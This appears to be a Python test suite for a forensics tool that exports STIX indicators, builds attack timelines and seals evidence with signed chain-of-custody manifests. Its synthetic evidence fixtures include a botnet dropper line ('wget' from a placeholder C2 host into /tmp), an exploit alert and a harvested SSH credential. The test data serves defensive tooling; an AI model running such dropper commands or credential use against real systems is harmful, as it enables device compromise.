#!/usr/bin/env python3
"""Tests for intel/forensics.py (#158). Plain asserts, exit non-zero on failure."""
import json, os, shutil, subprocess, sys, tempfile

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FORENSICS = os.path.join(REPO, "intel", "forensics.py")
FAILS = []

def check(name, cond):
    if cond:
        print(f"  ok {name}")
    else:
        print(f"  FAIL {name}")
        FAILS.append(name)

def make_evidence(d):
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, "cam-01.log"), "w") as f:
        f.write("2026-08-21T15:00:00+00:00 LISTEN cam-01 type=tbk-dvr port=80\n")
        f.write("2026-08-21T15:00:10+00:00 TBK DROP received cmd='wget http://c2:8443/bot/notnet -O /tmp/.notnet'\n")
        f.write("2026-08-21T15:00:12+00:00 EXECUTING DROP: wget http://c2:8443/bot/notnet\n")
    with open(os.path.join(d, "legacy-cam-01.log"), "w") as f:
        f.write("2026-08-21T15:01:00+00:00 LISTEN legacy-cam-01 port=80\n")
    with open(os.path.join(d, "http.log"), "w") as f:
        for ts in ("15:00:20", "15:00:22", "15:00:24"):
            f.write(f"2026-08-21T{ts}+00:00 C2 heartbeat from 172.29.0.9 body={{\"tag\":\"sim-bot\"}}\n")
    with open(os.path.join(d, "ids_alerts.log"), "w") as f:
        f.write("2026-08-21T15:00:11+00:00 ALERT sig=CVE-EXPLOIT src=172.29.0.9 dst=cam-01 CVE-2024-3721 verify passed\n")
    with open(os.path.join(d, "cred-harvest.log"), "w") as f:
        f.write("2026-08-21T15:00:15+00:00 ssh|172.29.10.30|22|admin|123456 harvested\n")
    with open(os.path.join(d, "relay.log"), "w") as f:
        f.write("2026-08-21T15:02:00+00:00 RELAY tok 10.0.0.9 22 VIA 10.0.0.5:1081\n")
    with open(os.path.join(d, "paths.log"), "w") as f:
        f.write("2026-08-21T15:03:00+00:00 SERVE /api/v1/bot from 172.29.0.9\n")

tmp = tempfile.mkdtemp()
ev = os.path.join(tmp, "evidence")
make_evidence(ev)
print("== iocs ==")
bundle_path = os.path.join(tmp, "bundle.json")
r = subprocess.run([sys.executable, FORENSICS, "iocs", "--evidence", ev, "--out", bundle_path],
                   capture_output=True, text=True)
print(r.stdout.strip() or r.stderr.strip())
check("iocs exits 0", r.returncode == 0)
b = json.load(open(bundle_path))
types = set()
for o in b["objects"]:
    pat = o.get("pattern", "")
    types.add(pat.split(":")[0].lstrip("["))
check(f">=5 STIX types (got {len(types)})", len(types) >= 5)
check("bundle type is bundle", b["type"] == "bundle")
check("all objects have spec 2.1", all(o.get("spec_version") == "2.1" for o in b["objects"]))
check("has ipv4 indicator", any("[ipv4-addr:" in o.get("pattern","") for o in b["objects"]))
check("has domain indicator", any("[domain-name:" in o.get("pattern","") for o in b["objects"]))
check("has file hash indicator", any("file:hashes" in o.get("pattern","") for o in b["objects"]))

print("== timeline ==")
tl_json = os.path.join(tmp, "timeline.json")
r = subprocess.run([sys.executable, FORENSICS, "timeline", "--evidence", ev, "--out", tl_json],
                   capture_output=True, text=True)
print(r.stdout.strip() or r.stderr.strip())
check("timeline exits 0", r.returncode == 0)
t = json.load(open(tl_json))
ts_list = [e["ts"] for e in t["events"]]
check("events chronological", ts_list == sorted(ts_list))
check("has drop event", any(e["event_type"] == "drop" for e in t["events"]))
check("has c2-join event", any(e["event_type"] == "c2-join" for e in t["events"]))
# infection chain: cam-01 dropped, and the same URL appears in its own EXECUTING DROP.
# For a chain we'd need device B executing a URL first seen on device A — the
# synthetic data has one device; just assert the linking logic ran.
check("chain field present", "infection_chains" in t)

print("== md timeline ==")
tl_md = os.path.join(tmp, "timeline.md")
r = subprocess.run([sys.executable, FORENSICS, "timeline", "--evidence", ev, "--out", tl_md],
                   capture_output=True, text=True)
check("md timeline exits 0", r.returncode == 0)
check("md has table header", "| ts |" in open(tl_md).read())

print("== seal / verify round-trip (#276 signed) ==")
KEY = os.path.join(tmp, "custody.key")  # key lives OUTSIDE the evidence dir
with open(KEY, "w") as f:
    f.write("test-custody-key-276\n")
export_dir = os.path.join(tmp, "export")
os.makedirs(export_dir)
shutil.copy(bundle_path, export_dir)
shutil.copy(tl_json, export_dir)
chain_path = os.path.join(tmp, "chain.json")
env_key = dict(os.environ, FORENSICS_SIGNING_KEY="env-key-276")
r = subprocess.run([sys.executable, FORENSICS, "seal", "--dir", export_dir,
                    "--out", chain_path],
                   capture_output=True, text=True)
check("seal without key refused", r.returncode == 2 and "no signing key" in r.stderr)
r = subprocess.run([sys.executable, FORENSICS, "seal", "--dir", export_dir,
                    "--out", chain_path, "--keyfile", KEY],
                   capture_output=True, text=True)
print(r.stdout.strip() or r.stderr.strip())
check("seal with keyfile exits 0", r.returncode == 0)
check("seal reports SIGNED", "SIGNED" in r.stdout)
doc = json.load(open(chain_path))
check("v2 format has signature",
      doc.get("version") == 2 and "signature" in doc and "manifest" in doc)
r = subprocess.run([sys.executable, FORENSICS, "verify", "--chain",
                    chain_path, "--dir", export_dir, "--keyfile", KEY],
                   capture_output=True, text=True)
check("verify round-trip OK (signed)", r.returncode == 0 and "VERIFY OK" in r.stdout
      and "signature valid" in r.stdout)
# env-var key path seals independently (keys differ → MACs differ)
chain2 = os.path.join(tmp, "chain-env.json")
r2 = subprocess.run([sys.executable, FORENSICS, "seal", "--dir", export_dir,
                     "--out", chain2], capture_output=True, text=True, env=env_key)
check("env-key seal exits 0", r2.returncode == 0)
d1 = json.load(open(chain_path)); d2 = json.load(open(chain2))
check("distinct keys → distinct MACs",
      d1["signature"] != d2["signature"])
r = subprocess.run([sys.executable, FORENSICS, "verify", "--chain", chain2,
                    "--dir", export_dir],
                   capture_output=True, text=True, env=env_key)
check("env-key seal verifies with env key", r.returncode == 0)
# verify via env key too
r = subprocess.run([sys.executable, FORENSICS, "verify", "--chain",
                    chain_path, "--dir", export_dir],
                   capture_output=True, text=True, env=dict(os.environ, FORENSICS_SIGNING_KEY="test-custody-key-276"))
check("verify with matching env key OK", r.returncode == 0)

print("== #276 re-seal / truncation / missing-key detection ==")
# missing key at verify time → FAIL (fail-closed)
r = subprocess.run([sys.executable, FORENSICS, "verify", "--chain",
                    chain_path, "--dir", export_dir],
                   capture_output=True, text=True,
                   env={k: v for k, v in os.environ.items() if k != "FORENSICS_SIGNING_KEY"})
check("missing key fails verify", r.returncode == 1 and "signing key unavailable" in r.stderr)
# wrong key fails
r = subprocess.run([sys.executable, FORENSICS, "verify", "--chain",
                    chain_path, "--dir", export_dir],
                   capture_output=True, text=True, env=env_key)
check("wrong key fails verify", r.returncode == 1)

def fresh_seal():
    """Re-create pristine evidence + sealed chain."""
    if os.path.isdir(export_dir):
        shutil.rmtree(export_dir)
    os.makedirs(export_dir)
    shutil.copy(bundle_path, export_dir)
    shutil.copy(tl_json, export_dir)
    r = subprocess.run([sys.executable, FORENSICS, "seal", "--dir", export_dir,
                        "--out", chain_path, "--keyfile", KEY],
                       capture_output=True, text=True)
    assert r.returncode == 0, r.stderr

# attack 1: rewrite history + re-seal WITHOUT the custody key → detected
fresh_seal()
with open(os.path.join(export_dir, "bundle.json"), "a") as f:
    f.write("forged line\n")
# attacker re-seals the forged evidence with their own key (they lack ours)
atk_env = dict(os.environ, FORENSICS_SIGNING_KEY="attacker-key")
r = subprocess.run([sys.executable, FORENSICS, "seal", "--dir", export_dir,
                    "--out", chain_path],
                   capture_output=True, text=True, env=atk_env)
check("attacker can re-seal with own key (expected)", r.returncode == 0)
r = subprocess.run([sys.executable, FORENSICS, "verify", "--chain",
                    chain_path, "--dir", export_dir, "--keyfile", KEY],
                   capture_output=True, text=True)
check("re-seal with wrong key DETECTED", r.returncode == 1 and "signature mismatch" in r.stdout)

# attack 2: tail truncation — drop the LAST entry + its file. The remaining
# chain links stay internally consistent; only the signed manifest catches it.
fresh_seal()
trunc_chain = json.load(open(chain_path))
dropped = trunc_chain["entries"].pop()  # last entry = timeline.json
os.remove(os.path.join(export_dir, dropped["file"]))
json.dump(trunc_chain, open(chain_path, "w"), indent=2)
r = subprocess.run([sys.executable, FORENSICS, "verify", "--chain",
                    chain_path, "--dir", export_dir, "--keyfile", KEY],
                   capture_output=True, text=True)
check("tail truncation DETECTED", r.returncode == 1)

# legacy v1 unsigned seal still verifies, with warning
legacy_entries = []
prev = "0" * 64
for fn in sorted(os.listdir(export_dir)):
    h = subprocess.run([sys.executable, "-c",
                        f"import hashlib,sys;print(hashlib.sha256(open(sys.argv[1],'rb').read()).hexdigest())",
                        os.path.join(export_dir, fn)],
                       capture_output=True, text=True).stdout.strip()
    legacy_entries.append({"file": fn, "sha256": h, "prev_hash": prev})
    prev = h
legacy_path = os.path.join(tmp, "chain-v1.json")
json.dump(legacy_entries, open(legacy_path, "w"), indent=2)
r = subprocess.run([sys.executable, FORENSICS, "verify", "--chain",
                    legacy_path, "--dir", export_dir],
                   capture_output=True, text=True)
check("legacy v1 verifies with warning",
      r.returncode == 0 and "UNSIGNED" in r.stdout
      and "UNDETECTABLE" in r.stderr)

print("== tamper detection ==")
fresh_seal()
with open(os.path.join(export_dir, "bundle.json"), "a") as f:
    f.write("tampered")
r = subprocess.run([sys.executable, FORENSICS, "verify", "--chain",
                    chain_path, "--dir", export_dir, "--keyfile", KEY],
                   capture_output=True, text=True)
check("tampered file detected", r.returncode == 1)

shutil.rmtree(tmp)
print()
if FAILS:
    print(f"{len(FAILS)} FAILED: {', '.join(FAILS)}")
    sys.exit(1)
print("ALL FORENSICS TESTS PASS")
